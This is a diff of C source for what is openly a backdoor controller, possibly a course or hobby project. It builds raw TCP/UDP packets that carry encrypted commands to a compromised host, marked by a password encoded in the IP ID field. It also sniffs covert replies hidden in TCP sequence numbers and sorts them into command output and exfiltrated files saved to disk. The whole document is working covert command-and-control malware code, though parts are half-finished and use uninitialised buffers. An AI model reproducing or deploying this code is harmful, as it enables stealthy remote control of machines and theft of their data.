@@ -9,10 +9,10 @@
 #include "client.h"
 #include "util.h"
 
-int end;
+char *data;
+int buf_len = 0;
 
-void backdoor_client(uint32 srcip, uint32 destip, char* protocol)
-{
+void backdoor_client(uint32 srcip, uint32 destip, char* protocol) {
 	client *cln;
 	char *cmd;
 	pthread_t pth_id;
@@ -25,12 +25,13 @@ void backdoor_client(uint32 srcip, uint32 destip, char* protocol)
 	}
 
 	// Check for correct arguments, and provide them with a usage.
-	if((srcip == 0) && (destip == 0)) {
+	if ((srcip == 0) && (destip == 0)) {
 		perror("Invalid IP Address");
 	}
 
-	 if((strcmp(protocol,"TCP") != 0) && (strcmp(protocol,"UDP") != 0)
-	            && (strcmp(protocol,"tcp") != 0) && (strcmp(protocol,"udp") != 0)) {
+	if ((strcmp(protocol, "TCP") != 0) && (strcmp(protocol, "UDP") != 0)
+			&& (strcmp(protocol, "tcp") != 0)
+			&& (strcmp(protocol, "udp") != 0)) {
 		perror("Invalid Protocol");
 	}
 
@@ -61,7 +62,7 @@ void backdoor_client(uint32 srcip, uint32 destip, char* protocol)
 
 	cmd = malloc(sizeof(char*));
 
-	while(1) {
+	while (1) {
 		puts("\nEnter a command and hit enter or Ctrl+C to Exit");
 		fgets(cmd, 4096, stdin);
 		send_packets(cln, cmd, protocol);
@@ -74,7 +75,6 @@ void backdoor_client(uint32 srcip, uint32 destip, char* protocol)
 
 	//return EXIT_SUCCESS;
 }
-
 
 client *client_new(void) {
 	client *c = malloc(sizeof(client));
@@ -89,7 +89,7 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 	int randomID = 0;
 
-	 if((strcmp(protocol,"TCP") == 0) || (strcmp(protocol,"tcp") == 0)) {
+	if ((strcmp(protocol, "TCP") == 0) || (strcmp(protocol, "tcp") == 0)) {
 		// IP header fields
 		packets_tcp.ip.version = 4;
 		packets_tcp.ip.ihl = 5;
@@ -127,7 +127,7 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 		// Add the data to the datagram
 		// encrypt data
-		//encrypt(SEKRET, msg, sizeof(msg));
+		encrypt(SEKRET, msg, sizeof(msg));
 		strcpy(packets_tcp.data, msg);
 
 		packets_tcp.tcp.source = htons(c->source_port);
@@ -140,12 +140,10 @@ void packet_new(client *c, char *msg, char* protocol) {
 		randomID = randomRange(5000, 5050);
 		packets_tcp.ip.id = htons(randomID);
 
-
-		packets_tcp.ip.tot_len = ((4 * packets_tcp.ip.ihl) + (4 * packets_tcp.tcp.doff)
-				+ strlen(packets_tcp.data));
+		packets_tcp.ip.tot_len = ((4 * packets_tcp.ip.ihl)
+				+ (4 * packets_tcp.tcp.doff) + strlen(packets_tcp.data));
 
 		packets_tcp.ip.check = in_cksum((unsigned short *) &packets_tcp.ip, 20);
-
 
 		// PSEUDO Header fields
 		pseudo_header_tcp.source_address = packets_tcp.ip.saddr;
@@ -156,9 +154,11 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 		bcopy((char *) &packets_tcp.tcp, (char *) &pseudo_header_tcp.tcp, 20);
 		/* Final checksum on the entire package */
-		packets_tcp.tcp.check = in_cksum((unsigned short *) &pseudo_header_tcp, 32);
+		packets_tcp.tcp.check = in_cksum((unsigned short *) &pseudo_header_tcp,
+				32);
 
-	} else if((strcmp(protocol,"UDP") == 0) || (strcmp(protocol,"udp") == 0)) {
+	} else if ((strcmp(protocol, "UDP") == 0)
+			|| (strcmp(protocol, "udp") == 0)) {
 
 		packets_udp.ip.version = 4;
 		packets_udp.ip.ihl = 5;
@@ -180,7 +180,7 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 		// Add the data to the datagram
 		// encrypt data
-		//encrypt(SEKRET, msg, sizeof(msg));
+		encrypt(SEKRET, msg, sizeof(msg));
 		strcpy(packets_udp.data, msg);
 
 		packets_udp.udp.source = htons(c->source_port);
@@ -193,7 +193,8 @@ void packet_new(client *c, char *msg, char* protocol) {
 		randomID = randomRange(5000, 5050);
 		packets_udp.ip.id = htons(randomID);
 
-		packets_udp.ip.tot_len = ((4 * packets_udp.ip.ihl) + sizeof(packets_udp.udp)+ strlen(packets_udp.data));
+		packets_udp.ip.tot_len = ((4 * packets_udp.ip.ihl)
+				+ sizeof(packets_udp.udp) + strlen(packets_udp.data));
 
 		packets_udp.ip.check = in_cksum((unsigned short *) &packets_udp.ip, 20);
 
@@ -210,7 +211,8 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 		bcopy((char *) &packets_udp.udp, (char *) &pseudo_header_udp.udp, 20);
 		/* Final checksum on the entire package */
-		packets_udp.udp.check = in_cksum((unsigned short *) &pseudo_header_udp, 8);
+		packets_udp.udp.check = in_cksum((unsigned short *) &pseudo_header_udp,
+				8);
 
 	}
 
@@ -222,7 +224,7 @@ void send_packets(client *c, char *input, char* protocol) {
 
 	packet_new(c, input, protocol);
 
-	 if((strcmp(protocol,"TCP") == 0) || (strcmp(protocol,"tcp") == 0)) {
+	if ((strcmp(protocol, "TCP") == 0) || (strcmp(protocol, "tcp") == 0)) {
 		sin.sin_family = AF_INET;
 		sin.sin_port = packets_tcp.tcp.dest;
 		sin.sin_addr.s_addr = packets_tcp.ip.daddr;
@@ -237,7 +239,8 @@ void send_packets(client *c, char *input, char* protocol) {
 
 		close(send_socket);
 
-	} else if((strcmp(protocol,"UDP") == 0) || (strcmp(protocol,"udp") == 0)) {
+	} else if ((strcmp(protocol, "UDP") == 0)
+			|| (strcmp(protocol, "udp") == 0)) {
 		sin.sin_family = AF_INET;
 		sin.sin_port = packets_udp.udp.dest;
 		sin.sin_addr.s_addr = packets_udp.ip.daddr;
@@ -246,7 +249,8 @@ void send_packets(client *c, char *input, char* protocol) {
 			SystemFatal("send_packets(): socket: unable to create a socket.");
 		}
 
-		sendto(send_socket, &packets_udp, packets_udp.ip.tot_len, 0,(struct sockaddr *) &sin, sizeof(sin));
+		sendto(send_socket, &packets_udp, packets_udp.ip.tot_len, 0,
+				(struct sockaddr *) &sin, sizeof(sin));
 		printf("Sending Command: %s\n", input);
 
 		close(send_socket);
@@ -258,7 +262,6 @@ void SystemFatal(char *msg) {
 	printf("\n%s\n\n", msg);
 	exit(EXIT_FAILURE);
 }
-
 
 /*-------- Checksum Algorithm (Public domain Ping) ----------------------*/
 unsigned short in_cksum(unsigned short *addr, int len) {
@@ -299,8 +302,8 @@ void *sniffer_thread(void *args) {
 
 	if ((pd = open_pcap_socket(device, filter))) {
 		//while (running) {
-			if (pcap_loop(pd, 0, (pcap_handler) parse_packet, 0) < 0)
-				printf("pcap_loop(): failed: %s\n", pcap_geterr(pd));
+		if (pcap_loop(pd, 0, (pcap_handler) parse_response_packet, 0) < 0)
+			printf("pcap_loop(): failed: %s\n", pcap_geterr(pd));
 		//}
 		//running = true;
 	}
@@ -310,7 +313,7 @@ void *sniffer_thread(void *args) {
 
 pcap_t * open_pcap_socket(char *device, const char *filter) {
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t *pd;
+	pcap_t * pd;
 	uint32_t srcip, netmask;
 	struct bpf_program bpf;
 
@@ -367,19 +370,21 @@ void parse_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *packet) {
 		// decrypt payload
 		//tcp_payload = decrypt();
 		fprintf(file, "Command Response: \n\n%s\n", tcp_payload);
-		fprintf(file,"==================================================================\n\n");
+		fprintf(file,
+				"==================================================================\n\n");
 
 		fclose(file);
 		//running = false;
 	}
 }
 
-void parse_response_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *packet) {
+void parse_response_packet(u_char *user, struct pcap_pkthdr *packethdr,
+		u_char *packet) {
 	struct iphdr* iphdr;
 	struct tcphdr* tcphdr;
+	char *ptr;
 	char *tcp_payload;
-	int size_ip, size_tcp;
-
+	int size_ip, size_tcp, password;
 
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	tcphdr = (struct tcphdr*) (packet + sizeof(struct ether_header)
@@ -389,60 +394,58 @@ void parse_response_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *
 	size_tcp = tcphdr->doff * 4;
 
 	if (size_tcp < 20) {
-		printf("INVALID TCP HEADER SIZE\n");
-		return;
+		error("parse_response_packet - INVALID TCP HEADER SIZE\n");
 	}
 
-	if ((ntohs(iphdr->id) >= 5000) && (ntohs(iphdr->id) <= 5050)) {
+	password = ntohs(iphdr->id) - DEF_IP_ID;
 
-		while(!end) {
+	if ((password >= 5000) && (password <= 5050)) {
 
-			char *ptr = 0;
-			char *data;
-			int buf_len = 0;
+		/*tcp_payload = malloc(sizeof(char *));
 
-			ptr += 4;
+		//tcp_payload = (char *)tcphdr->seq;
+		//sscanf(tcp_payload, "%c", tcphdr->seq);
 
-			tcp_payload = (char *) (packet + sizeof(struct ether_header) + size_ip
-					+ size_tcp);
+		if (buf_len == 0)
+			data = (char *) malloc(FRAM_SZ);
 
-			tcp_payload += 4;
+		ptr = (char *) (tcphdr + 4); */
 
-			memcpy(data, tcp_payload, 1);
-			buf_len += 1;
+		//char * payload = tcphdr->seq;
+		printf("%c", tcphdr->seq);
 
-			if (buf_len % FRAM_SZ != 0) {
-				continue;
-			}
+		/*char * character = malloc(sizeof(tcphdr->seq));
+		character = tcphdr->seq;
+		printf("%s \n", character);*/
 
-			tcp_payload -= FRAM_SZ - 1;
+		//char word = (char)tcphdr->seq;
+		//data += word;
+		//strcat(data, word);
+		//memcpy(data, ptr, 1);
+
+		//fprintf(stdout, "data: %s \n", data);
+
+		/*buf_len += 1;
+
+		if (buf_len % FRAM_SZ == 0) {
+
+			data -= FRAM_SZ - 1;*/
 
 			// decrypt payload
 			//decrypt(SEKRET, data, FRAM_SZ);
 
+			int sourcePort = ntohs(tcphdr->source);
 
-			// decrypt payload
-			//tcp_payload = decrypt();
-			printf("Command Response: \n\n%s\n", tcp_payload);
-			printf("==================================================================\n\n");
-		}
+			if (sourcePort == RSP_TYP) {
+				printf("Command Response: \n\n%s\n", data);
+				printf(
+						"==================================================================\n\n");
+			} else if (sourcePort == XFL_TYP) {
+				writeToFile(data);
+			}
 
-		//fclose(file);
-		//running = false;
+			//buf_len = 0;
+			//free(data);
+		//}
 	}
-}
-
-unsigned int host_convert(char *hostname) {
-	static struct in_addr i;
-	struct hostent *h;
-	i.s_addr = inet_addr(hostname);
-	if (i.s_addr == -1) {
-		h = gethostbyname(hostname);
-		if (h == NULL) {
-			fprintf(stderr, "cannot resolve %s\n", hostname);
-			exit(0);
-		}
-		bcopy(h->h_addr, (char *) &i.s_addr, h->h_length);
-	}
-	return i.s_addr;
 }
